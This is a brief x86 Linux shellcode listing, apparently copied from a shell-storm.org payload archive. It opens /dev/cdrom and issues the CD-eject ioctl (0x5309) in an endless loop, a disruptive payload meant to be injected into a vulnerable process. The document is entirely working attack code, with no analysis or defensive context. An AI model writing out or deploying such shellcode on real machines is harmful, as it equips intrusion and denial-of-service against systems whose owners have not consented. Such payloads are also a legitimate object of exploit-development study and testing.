; http://shell-storm.org/shellcode/files/shellcode-231.php


push 0x5 
pop eax 
xor ecx,ecx 
push ecx 
mov ch, 0x8 
push 0x6d6f7264 
push 0x632f7665 
push 0x642f2f2f 
mov ebx, esp 
int 0x80 
mov ebx, eax 
mov cx, 0x5309
 
openit:
 mov al, 0x36 
 int 0x80 
 jmp openit